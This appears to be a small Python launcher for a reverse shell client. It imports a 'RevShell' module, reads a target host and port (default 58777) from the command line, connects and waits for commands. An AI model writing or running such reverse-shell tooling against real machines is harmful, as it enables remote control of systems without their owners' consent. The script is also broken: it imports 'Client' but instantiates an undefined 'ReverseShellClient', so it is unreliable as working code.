from RevShell import Client

if __name__ == '__main__':
    from argparse import ArgumentParser
    p = ArgumentParser()
    p.add_argument('host')
    p.add_argument('--port', '-p', type=int, default=58777)
    args = p.parse_args()
    client = ReverseShellClient()
    client.connect(args.host, args.port)
    client.receive()
    client.stop()